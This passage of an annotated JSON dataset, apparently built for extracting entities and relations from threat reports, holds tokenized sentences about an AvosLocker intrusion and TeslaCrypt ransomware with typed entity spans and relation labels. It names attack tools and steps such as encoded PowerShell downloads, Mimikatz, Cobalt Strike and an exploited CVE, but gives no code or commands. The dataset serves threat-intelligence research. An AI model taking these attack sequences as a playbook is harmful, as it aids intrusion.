"2_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [68, 68], "name": "malicious tools", "pos": [3, 5], "index": "3_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [74, 74], "name": "LoLBins", "pos": [9, 10], "index": "4_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [89, 89], "name": "wmiprvse.exe", "pos": [8, 9], "index": "5_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [107, 107], "name": "PowerShell", "pos": [26, 27], "index": "6_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [130, 130], "name": "RuntimeBrokerService.exe", "pos": [11, 12], "index": "7_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [144, 144], "name": "watcher.exe", "pos": [25, 26], "index": "8_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [149, 149], "name": "PowerShell", "pos": [2, 3], "index": "9_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [163, 163], "name": "attacker", "pos": [16, 17], "index": "10_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [166, 166], "name": "PowerShell scripts", "pos": [19, 21], "index": "11_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [177, 177], "name": "vmware_kb.exe", "pos": [30, 31], "index": "12_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [181, 181], "name": "PowerShell scripts", "pos": [1, 3], "index": "13_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [195, 195], "name": "Mimikatz", "pos": [15, 16], "index": "14_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [202, 202], "name": "IIS Temporary Compressed Files.zip", "pos": [22, 26], "index": "15_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [217, 217], "name": "scanner.exe", "pos": [37, 38], "index": "16_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [221, 221], "name": "attackers", "pos": [1, 2], "index": "17_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [224, 224], "name": "administrative settings", "pos": [4, 6], "index": "18_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [227, 227], "name": "WMIC", "pos": [7, 8], "index": "19_0"}]], "labels": [{"r": "WR", "evidence": [0], "t": 0, "h": 1}, {"r": "WR", "evidence": [0], "t": 0, "h": 1}, {"r": "WR", "evidence": [0, 1, 2], "h": 1, "t": 3}, {"r": "CO", "evidence": [0, 1], "h": 1, "t": 2}, {"r": "CO", "evidence": [0, 1, 2, 3, 4, 5], "h": 1, "t": 10}, {"r": "CO", "evidence": [0, 1, 2, 3, 4, 5, 6, 7], "h": 1, "t": 17}, {"r": "WR", "evidence": [1, 2], "h": 2, "t": 3}, {"r": "WR", "evidence": [1, 2], "h": 2, "t": 4}, {"r": "EX", "evidence": [1, 2, 3], "h": 2, "t": 5}, {"r": "FR", "evidence": [1, 2, 3], "h": 2, "t": 6}, {"r": "WR", "evidence": [2, 3], "t": 3, "h": 6}, {"r": "WR", "evidence": [2, 3], "t": 4, "h": 6}, {"r": "RD", "evidence": [3, 4], "h": 6, "t": 7}, {"r": "FR", "evidence": [3, 4], "h": 6, "t": 8}, {"r": "RD", "evidence": [4, 5], "t": 7, "h": 9}, {"r": "RD", "evidence": [4, 5], "t": 7, "h": 9}, {"r": "WR", "evidence": [4, 5], "t": 7, "h": 9}, {"r": "EX", "evidence": [5], "h": 10, "t": 11}, {"r": "WR", "evidence": [5], "h": 10, "t": 12}, {"r": "EX", "evidence": [5, 6], "h": 10, "t": 13}, {"r": "WR", "evidence": [5, 6], "h": 10, "t": 14}, {"r": "WR", "evidence": [5, 6], "h": 10, "t": 15}, {"r": "WR", "evidence": [5, 6], "h": 10, "t": 16}, {"r": "FR", "evidence": [7], "h": 17, "t": 19}, {"r": "RD", "evidence": [7], "t": 18, "h": 19}, {"r": "WR", "evidence": [7], "t": 18, "h": 19}]}, {"title": "07_g02-3", "sents": [["The", "threat", "actors", "tried", "multiple", "ways", "to", "gain", "a", "foothold", "on", "the", "victim", "network", "during", "the", "attack", "\u2019", "s", "initial", "stages", "."], ["Talos", "observed", "various", "malicious", "tools", "and", "living-off-the-land", "binaries", "(", "LoLBins", ")", "were", "deployed", "on", "endpoints", "."], ["In", "addition", ",", "the", "WMI", "Provider", "Host", "(", "wmiprvse.exe", ")", "on", "a", "Windows", "Server", "was", "used", "as", "the", "initial", "point", "of", "entry", ",", "and", "an", "encoded", "PowerShell", "script", "was", "executed", "using", "the", "DownloadString", "method", "on", "Feb.", "11", "."], ["On", "Feb.", "14", ",", "a", "retrospective", "detection", "was", "triggered", "for", "the", "RuntimeBrokerService.exe", "executable", "in", "``", "C", ":", "\\Windows\\System32\\temp", "''", "for", "creating", "a", "file", "named", "``", "watcher.exe", ".", "''"], ["Another", "encoded", "PowerShell", "command", "was", "executed", "on", "March", "4", ",", "and", "two", "days", "later", ",", "the", "attacker", "ran", "more", "PowerShell", "scripts", "to", "download", "and", "execute", "a", "Sliver", "payload", "labeled", "``", "vmware_kb.exe", ".", "''"], ["Various", "PowerShell", "scripts", "were", "downloaded", "in", "the", "following", "days", "to", "obtain", "additional", "files", ",", "including", "Mimikatz", "and", "a", ".zip", "archive", "called", "``", "IIS", "Temporary", "Compressed", "Files.zip", "''", "containing", "Cobalt", "Strike", "beacons", "and", "a", "port", "scanner", "labeled", "``", "scanner.exe", ".", "''"], ["The", "attackers", "also", "modified", "administrative", "settings", "using", "WMIC", "on", "both", "local", "and", "remote", "hosts", "to", "move", "laterally", "."], ["On", "March", "8th", ",", "the", "AvosLocker", "payload", "was", "delivered", "via", "the", "victim", "'s", "company", "name", "using", "AnyDesk", "to", "another", "server", "in", "the", "network", ",", "and", "the", "SoftPerfect", "Network", "Scanner", "was", "utilized", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [2, 2], "name": "actors", "pos": [2, 3], "index": "0_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [25, 25], "name": "malicious tools", "pos": [3, 5], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [31, 31], "name": "LoLBins", "pos": [9, 10], "index": "2_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [46, 46], "name": "wmiprvse.exe", "pos": [8, 9], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [64, 64], "name": "PowerShell", "pos": [26, 27], "index": "4_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [87, 87], "name": "RuntimeBrokerService.exe", "pos": [11, 12], "index": "5_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [101, 101], "name": "watcher.exe", "pos": [25, 26], "index": "6_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [106, 106], "name": "PowerShell", "pos": [2, 3], "index": "7_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [120, 120], "name": "attacker", "pos": [16, 17], "index": "8_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [123, 123], "name": "PowerShell scripts", "pos": [19, 21], "index": "9_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [134, 134], "name": "vmware_kb.exe", "pos": [30, 31], "index": "10_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [138, 138], "name": "PowerShell scripts", "pos": [1, 3], "index": "11_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [152, 152], "name": "Mimikatz", "pos": [15, 16], "index": "12_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [159, 159], "name": "IIS Temporary Compressed Files.zip", "pos": [22, 26], "index": "13_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [174, 174], "name": "scanner.exe", "pos": [37, 38], "index": "14_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [178, 178], "name": "attackers", "pos": [1, 2], "index": "15_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [181, 181], "name": "administrative settings", "pos": [4, 6], "index": "16_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [184, 184], "name": "WMIC", "pos": [7, 8], "index": "17_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [211, 211], "name": "AnyDesk", "pos": [16, 17], "index": "18_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [214, 214], "name": "server", "pos": [19, 20], "index": "19_0"}]], "labels": [{"r": "WR", "evidence": [0, 1], "h": 0, "t": 1}, {"r": "WR", "evidence": [0, 1], "h": 0, "t": 2}, {"r": "EX", "evidence": [0, 1, 2], "h": 0, "t": 3}, {"r": "FR", "evidence": [0, 1, 2], "h": 0, "t": 4}, {"r": "WR", "evidence": [1, 2], "t": 1, "h": 4}, {"r": "WR", "evidence": [1, 2], "t": 2, "h": 4}, {"r": "RD", "evidence": [2, 3], "h": 4, "t": 5}, {"r": "FR", "evidence": [2, 3], "h": 4, "t": 6}, {"r": "RD", "evidence": [3, 4], "t": 5, "h": 7}, {"r": "RD", "evidence": [3, 4], "t": 5, "h": 7}, {"r": "WR", "evidence": [3, 4], "t": 5, "h": 7}, {"r": "EX", "evidence": [4], "h": 8, "t": 9}, {"r": "WR", "evidence": [4], "h": 8, "t": 10}, {"r": "EX", "evidence": [4, 5], "h": 8, "t": 11}, {"r": "WR", "evidence": [4, 5], "h": 8, "t": 12}, {"r": "WR", "evidence": [4, 5], "h": 8, "t": 13}, {"r": "WR", "evidence": [4, 5], "h": 8, "t": 14}, {"r": "FR", "evidence": [6], "h": 15, "t": 17}, {"r": "RD", "evidence": [6], "t": 16, "h": 17}, {"r": "WR", "evidence": [6], "t": 16, "h": 17}, {"r": "FR", "evidence": [6, 7], "h": 15, "t": 18}, {"r": "ST", "evidence": [7], "h": 18, "t": 19}]}, {"title": "07_g02-4", "sents": [["Talos", "observed", "various", "malicious", "tools", "and", "living-off-the-land", "binaries", "(", "LoLBins", ")", "were", "deployed", "on", "endpoints", "."], ["In", "addition", ",", "the", "WMI", "Provider", "Host", "(", "wmiprvse.exe", ")", "on", "a", "Windows", "Server", "was", "used", "as", "the", "initial", "point", "of", "entry", ",", "and", "an", "encoded", "PowerShell", "script", "was", "executed", "using", "the", "DownloadString", "method", "on", "Feb.", "11", "."], ["On", "Feb.", "14", ",", "a", "retrospective", "detection", "was", "triggered", "for", "the", "RuntimeBrokerService.exe", "executable", "in", "``", "C", ":", "\\Windows\\System32\\temp", "''", "for", "creating", "a", "file", "named", "``", "watcher.exe", ".", "''"], ["Another", "encoded", "PowerShell", "command", "was", "executed", "on", "March", "4", ",", "and", "two", "days", "later", ",", "the", "attacker", "ran", "more", "PowerShell", "scripts", "to", "download", "and", "execute", "a", "Sliver", "payload", "labeled", "``", "vmware_kb.exe", ".", "''"], ["Various", "PowerShell", "scripts", "were", "downloaded", "in", "the", "following", "days", "to", "obtain", "additional", "files", ",", "including", "Mimikatz", "and", "a", ".zip", "archive", "called", "``", "IIS", "Temporary", "Compressed", "Files.zip", "''", "containing", "Cobalt", "Strike", "beacons", "and", "a", "port", "scanner", "labeled", "``", "scanner.exe", ".", "''"], ["The", "attackers", "also", "modified", "administrative", "settings", "using", "WMIC", "on", "both", "local", "and", "remote", "hosts", "to", "move", "laterally", "."], ["On", "March", "8th", ",", "the", "AvosLocker", "payload", "was", "delivered", "via", "the", "victim", "'s", "company", "name", "using", "AnyDesk", "to", "another", "server", "in", "the", "network", ",", "and", "the", "SoftPerfect", "Network", "Scanner", "was", "utilized", "."], ["PDQ", "Deploy", ",", "a", "legitimate", "software", "deployment", "tool", ",", "was", "used", "to", "spread", "the", "ransomware", "and", "other", "tools", "across", "the", "target", "network", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [3, 3], "name": "malicious tools", "pos": [3, 5], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [9, 9], "name": "LoLBins", "pos": [9, 10], "index": "1_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [24, 24], "name": "wmiprvse.exe", "pos": [8, 9], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [42, 42], "name": "PowerShell", "pos": [26, 27], "index": "3_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [65, 65], "name": "RuntimeBrokerService.exe", "pos": [11, 12], "index": "4_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [79, 79], "name": "watcher.exe", "pos": [25, 26], "index": "5_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [84, 84], "name": "PowerShell", "pos": [2, 3], "index": "6_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [98, 98], "name": "attacker", "pos": [16, 17], "index": "7_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [101, 101], "name": "PowerShell scripts", "pos": [19, 21], "index": "8_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [112, 112], "name": "vmware_kb.exe", "pos": [30, 31], "index": "9_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [116, 116], "name": "PowerShell scripts", "pos": [1, 3], "index": "10_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [130, 130], "name": "Mimikatz", "pos": [15, 16], "index": "11_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [137, 137], "name": "IIS Temporary Compressed Files.zip", "pos": [22, 26], "index": "12_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [152, 152], "name": "scanner.exe", "pos": [37, 38], "index": "13_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [156, 156], "name": "attackers", "pos": [1, 2], "index": "14_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [159, 159], "name": "administrative settings", "pos": [4, 6], "index": "15_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [162, 162], "name": "WMIC", "pos": [7, 8], "index": "16_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [189, 189], "name": "AnyDesk", "pos": [16, 17], "index": "17_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [192, 192], "name": "server", "pos": [19, 20], "index": "18_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [205, 205], "name": "PDQ Deploy", "pos": [0, 2], "index": "19_0"}]], "labels": [{"r": "WR", "evidence": [0, 1], "t": 0, "h": 3}, {"r": "WR", "evidence": [0, 1], "t": 1, "h": 3}, {"r": "RD", "evidence": [1, 2], "h": 3, "t": 4}, {"r": "FR", "evidence": [1, 2], "h": 3, "t": 5}, {"r": "RD", "evidence": [2, 3], "t": 4, "h": 6}, {"r": "RD", "evidence": [2, 3], "t": 4, "h": 6}, {"r": "WR", "evidence": [2, 3], "t": 4, "h": 6}, {"r": "EX", "evidence": [3], "h": 7, "t": 8}, {"r": "WR", "evidence": [3], "h": 7, "t": 9}, {"r": "EX", "evidence": [3, 4], "h": 7, "t": 10}, {"r": "WR", "evidence": [3, 4], "h": 7, "t": 11}, {"r": "WR", "evidence": [3, 4], "h": 7, "t": 12}, {"r": "WR", "evidence": [3, 4], "h": 7, "t": 13}, {"r": "FR", "evidence": [5], "h": 14, "t": 16}, {"r": "RD", "evidence": [5], "t": 15, "h": 16}, {"r": "WR", "evidence": [5], "t": 15, "h": 16}, {"r": "FR", "evidence": [5, 6], "h": 14, "t": 17}, {"r": "FR", "evidence": [5, 6, 7], "h": 14, "t": 19}, {"r": "ST", "evidence": [6], "h": 17, "t": 18}]}, {"title": "07_g02-5", "sents": [["In", "addition", ",", "the", "WMI", "Provider", "Host", "(", "wmiprvse.exe", ")", "on", "a", "Windows", "Server", "was", "used", "as", "the", "initial", "point", "of", "entry", ",", "and", "an", "encoded", "PowerShell", "script", "was", "executed", "using", "the", "DownloadString", "method", "on", "Feb.", "11", "."], ["On", "Feb.", "14", ",", "a", "retrospective", "detection", "was", "triggered", "for", "the", "RuntimeBrokerService.exe", "executable", "in", "``", "C", ":", "\\Windows\\System32\\temp", "''", "for", "creating", "a", "file", "named", "``", "watcher.exe", ".", "''"], ["Another", "encoded", "PowerShell", "command", "was", "executed", "on", "March", "4", ",", "and", "two", "days", "later", ",", "the", "attacker", "ran", "more", "PowerShell", "scripts", "to", "download", "and", "execute", "a", "Sliver", "payload", "labeled", "``", "vmware_kb.exe", ".", "''"], ["Various", "PowerShell", "scripts", "were", "downloaded", "in", "the", "following", "days", "to", "obtain", "additional", "files", ",", "including", "Mimikatz", "and", "a", ".zip", "archive", "called", "``", "IIS", "Temporary", "Compressed", "Files.zip", "''", "containing", "Cobalt", "Strike", "beacons", "and", "a", "port", "scanner", "labeled", "``", "scanner.exe", ".", "''"], ["The", "attackers", "also", "modified", "administrative", "settings", "using", "WMIC", "on", "both", "local", "and", "remote", "hosts", "to", "move", "laterally", "."], ["On", "March", "8th", ",", "the", "AvosLocker", "payload", "was", "delivered", "via", "the", "victim", "'s", "company", "name", "using", "AnyDesk", "to", "another", "server", "in", "the", "network", ",", "and", "the", "SoftPerfect", "Network", "Scanner", "was", "utilized", "."], ["PDQ", "Deploy", ",", "a", "legitimate", "software", "deployment", "tool", ",", "was", "used", "to", "spread", "the", "ransomware", "and", "other", "tools", "across", "the", "target", "network", "."], ["Finally", ",", "the", "victim", "'s", "files", "were", "encrypted", "once", "the", "ransomware", "was", "delivered", ",", "and", "a", "ransom", "note", "appeared", "."]], "vertexSet": [[{"type": "TF", "sent_id": 0, "global_pos": [8, 8], "name": "wmiprvse.exe", "pos": [8, 9], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [26, 26], "name": "PowerShell", "pos": [26, 27], "index": "1_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [49, 49], "name": "RuntimeBrokerService.exe", "pos": [11, 12], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [63, 63], "name": "watcher.exe", "pos": [25, 26], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [68, 68], "name": "PowerShell", "pos": [2, 3], "index": "4_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [82, 82], "name": "attacker", "pos": [16, 17], "index": "5_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [85, 85], "name": "PowerShell scripts", "pos": [19, 21], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [96, 96], "name": "vmware_kb.exe", "pos": [30, 31], "index": "7_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [100, 100], "name": "PowerShell scripts", "pos": [1, 3], "index": "8_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [114, 114], "name": "Mimikatz", "pos": [15, 16], "index": "9_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [121, 121], "name": "IIS Temporary Compressed Files.zip", "pos": [22, 26], "index": "10_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [136, 136], "name": "scanner.exe", "pos": [37, 38], "index": "11_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [140, 140], "name": "attackers", "pos": [1, 2], "index": "12_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [143, 143], "name": "administrative settings", "pos": [4, 6], "index": "13_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [146, 146], "name": "WMIC", "pos": [7, 8], "index": "14_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [173, 173], "name": "AnyDesk", "pos": [16, 17], "index": "15_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [176, 176], "name": "server", "pos": [19, 20], "index": "16_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [189, 189], "name": "PDQ Deploy", "pos": [0, 2], "index": "17_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [215, 215], "name": "victim 's files", "pos": [3, 6], "index": "18_0"}]], "labels": [{"r": "RD", "evidence": [0, 1], "h": 1, "t": 2}, {"r": "FR", "evidence": [0, 1], "h": 1, "t": 3}, {"r": "RD", "evidence": [1, 2], "t": 2, "h": 4}, {"r": "RD", "evidence": [1, 2], "t": 2, "h": 4}, {"r": "WR", "evidence": [1, 2], "t": 2, "h": 4}, {"r": "EX", "evidence": [2], "h": 5, "t": 6}, {"r": "WR", "evidence": [2], "h": 5, "t": 7}, {"r": "EX", "evidence": [2, 3], "h": 5, "t": 8}, {"r": "WR", "evidence": [2, 3], "h": 5, "t": 9}, {"r": "WR", "evidence": [2, 3], "h": 5, "t": 10}, {"r": "WR", "evidence": [2, 3], "h": 5, "t": 11}, {"r": "FR", "evidence": [4], "h": 12, "t": 14}, {"r": "RD", "evidence": [4], "t": 13, "h": 14}, {"r": "WR", "evidence": [4], "t": 13, "h": 14}, {"r": "FR", "evidence": [4, 5], "h": 12, "t": 15}, {"r": "FR", "evidence": [4, 5, 6], "h": 12, "t": 17}, {"r": "ST", "evidence": [5], "h": 15, "t": 16}, {"r": "WR", "evidence": [6, 7], "h": 17, "t": 18}]}, {"title": "663-0", "sents": [["The", "malware", "states", "that", "data", "files", ",", "such", "as", "photos", ",", "videos", "and", "documents", "on", "the", "victim", "'", "s", "computer", "have", "been", "encrypted", "with", "the", "RSA-2048", "asymmetric", "algorithm", "."], ["TeslaCrypt", "is", "interesting", "because", "it", "also", "targets", "and", "encrypts", "computer", "games", "files", ",", "such", "as", "saved", "games", "and", "Steam", "activation", "keys", "."], ["Their", "SHA256", "SHA", "Both", "samples", "implement", "the", "following", "hashing", "algorithms", ":", "SHA", "Vector", "And", "Setup", "FunctionThis", "ransomware", "is", "usually", "distributed", "as", "an", "email", "attachment", "or", "through", "websites", "that", "redirect", "the", "victim", "to", "the", "Angler", "Exploit", "Kit", "."], ["In", "our", "analysis", ",", "the", "exploit", "kit", "delivered", "a", "malicious", "Flash", "object", "containing", "an", "exploit", "against", "CVE-2015-0311", "."], ["The", "final", "unpacked", "executable", "locates", "specific", "Windows", "directories", "such", "as", "the", "Application", "Data", "directory", ",", "and", "builds", "support", "files", "like", "the", "``", "key.dat", "''", "file", ",", "and", "files", "to", "store", "decryption", "instructions", "."], ["The", "executable", "also", "adjusts", "its", "own", "privileges", "(", "adds", "``", "SeDebugPrivilege", "''", ")", "and", "copies", "itself", "using", "a", "random", "file", "name", "to", "the", "user", "'", "s", "Application", "Data", "directory", "."], ["A", "new", "process", "is", "then", "spawned", "and", "execution", "is", "transferred", "to", "it", "."], ["The", "original", "dropper", "file", "is", "deleted", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "malware", "pos": [1, 2], "index": "0_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [16, 16], "name": "victim ' s computer", "pos": [16, 20], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [29, 29], "name": "TeslaCrypt", "pos": [0, 1], "index": "2_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [67, 67], "name": "ransomware", "pos": [16, 17], "index": "3_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [73, 73], "name": "email", "pos": [22, 23], "index": "4_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [77, 77], "name": "websites", "pos": [26, 27], "index": "5_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [81, 81], "name": "victim", "pos": [30, 31], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [84, 84], "name": "Angler Exploit Kit", "pos": [33, 36], "index": "7_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [93, 93], "name": "exploit kit", "pos": [5, 7], "index": "8_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [97, 97], "name": "malicious Flash", "pos": [9, 11], "index": "9_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [104, 104], "name": "CVE-2015-0311", "pos": [16, 17], "index": "10_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [109, 109], "name": "executable", "pos": [3, 4], "index": "11_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [123, 123], "name": "support files", "pos": [17, 19], "index": "12_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [128, 128], "name": "key.dat", "pos": [22, 23], "index": "13_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [136, 136], "name": "decryption instructions", "pos": [30, 32], "index": "14_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [140, 140], "name": "executable", "pos": [1, 2], "index": "15_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [149, 149], "name": "SeDebugPrivilege", "pos": [10, 11], "index": "16_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [154, 154], "name": "itself", "pos": [15, 16], "index": "17_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [165, 165], "name": "Application Data directory", "pos": [26, 29], "index": "18_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [170, 170], "name": "new process", "pos": [1, 3], "index": "19_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [183, 183], "name": "original dropper", "pos": [1, 3], "index": "20_0"}]], "labels": [{"r": "FR", "evidence": [0], "h": 0, "t": 1}, {"r": "FR", "evidence": [0, 1], "h": 1, "t": 2}, {"r": "ST", "evidence": [1, 2], "h": 2, "t": 5}, {"r": "RF", "evidence": [1, 2], "h": 2, "t": 5}, {"r": "FR", "evidence": [2], "t": 3, "h": 6}, {"r": "RD", "evidence": [2], "t": 4, "h": 6}, {"r": "ST", "evidence": [2], "t": 5, "h": 6}, {"r": "RF", "evidence": [2], "t": 5, "h": 6}, {"r": "EX", "evidence": [2], "h": 3, "t": 7}, {"r": "WR", "evidence": [2], "h": 6, "t": 7}, {"r": "FR", "evidence": [2, 3, 4], "h": 3, "t": 11}, {"r": "CO", "evidence": [2, 3], "h": 7, "t": 10}, {"r": "CO", "evidence": [2, 3], "h": 7, "t": 8}, {"r": "CO", "evidence": [2, 3], "h": 7, "t": 9}, {"r": "WR", "evidence": [4], "h": 11, "t": 12}, {"r": "CO", "evidence": [4], "h": 12, "t": 14}, {"r": "CO", "evidence": [4], "h": 12, "t": 13}, {"r": "WR", "evidence": [5], "h": 15, "t": 16}, {"r": "WR", "evidence": [5], "h": 15, "t": 17}, {"r": "CD", "evidence": [5], "h": 15, "t": 18}, {"r": "FR", "evidence": [5, 6], "h": 15, "t": 19}, {"r": "EX", "evidence": [5, 6], "t": 17, "h": 19}, {"r": "UK", "evidence": [6, 7], "h": 19, "t": 20}]}, {"title": "663-1", "sents": [["TeslaCrypt", "is", "interesting", "because", "it", "also", "targets", "and", "encrypts", "computer", "games", "files", ",", "such", "as", "saved", "games", "and", "Steam", "activation", "keys", "."], ["Their", "SHA256", "SHA", "Both", "samples", "implement", "the", "following", "hashing", "algorithms", ":", "SHA", "Vector", "And", "Setup", "FunctionThis", "ransomware", "is", "usually", "distributed", "as", "an", "email", "attachment", "or", "through", "websites", "that", "redirect", "the", "victim", "to", "the", "Angler", "Exploit", "Kit", "."], ["In", "our", "analysis", ",", "the", "exploit", "kit", "delivered", "a", "malicious", "Flash", "object", "containing", "an", "exploit", "against", "CVE-2015-0311", "."], ["The", "final", "unpacked", "executable", "locates", "specific", "Windows", "directories", "such", "as", "the", "Application", "Data", "directory", ",", "and", "builds", "support", "files", "like", "the", "``", "key.dat", "''", "file", ",", "and", "files", "to", "store", "decryption", "instructions", "."], ["The", "executable", "also", "adjusts", "its", "own", "privileges", "(", "adds", "``", "SeDebugPrivilege", "''", ")", "and", "copies", "itself", "using", "a", "random", "file", "name", "to", "the", "user", "'", "s", "Application", "Data", "directory", "."], ["A", "new", "process", "is", "then", "spawned", "and", "execution", "is", "transferred", "to", "it", "."], ["The", "original", "dropper", "file", "is", "deleted", "."], ["The", "main", "malware", "window", "is", "created", "and", "five", "threads", "are", "spawned", ",", "followed", "by", "the", "window", "message", "dispatching", "cycle", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [0, 0], "name": "TeslaCrypt", "pos": [0, 1], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [38, 38], "name": "ransomware", "pos": [16, 17], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [44, 44], "name": "email", "pos": [22, 23], "index": "2_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [48, 48], "name": "websites", "pos": [26, 27], "index": "3_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [52, 52], "name": "victim", "pos": [30, 31], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [55, 55], "name": "Angler Exploit Kit", "pos": [33, 36], "index": "5_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [64, 64], "name": "exploit kit", "pos": [5, 7], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [68, 68], "name": "malicious Flash", "pos": [9, 11], "index": "7_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [75, 75], "name": "CVE-2015-0311", "pos": [16, 17], "index": "8_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [80, 80], "name": "executable", "pos": [3, 4], "index": "9_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [94, 94], "name": "support files", "pos": [17, 19], "index": "10_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [99, 99], "name": "key.dat", "pos": [22, 23], "index": "11_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [107, 107], "name": "decryption instructions", "pos": [30, 32], "index": "12_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [111, 111], "name": "executable", "pos": [1, 2], "index": "13_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [120, 120], "name": "SeDebugPrivilege", "pos": [10, 11], "index": "14_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [125, 125], "name": "itself", "pos": [15, 16], "index": "15_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [136, 136], "name": "Application Data directory", "pos": [26, 29], "index": "16_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [141, 141], "name": "new process", "pos": [1, 3], "index": "17_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [154, 154], "name": "original dropper", "pos": [1, 3], "index": "18_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [162, 162], "name": "malware window", "pos": [2, 4], "index": "19_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [167, 167], "name": "five threads", "pos": [7, 9], "index": "20_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [175, 175], "name": "window 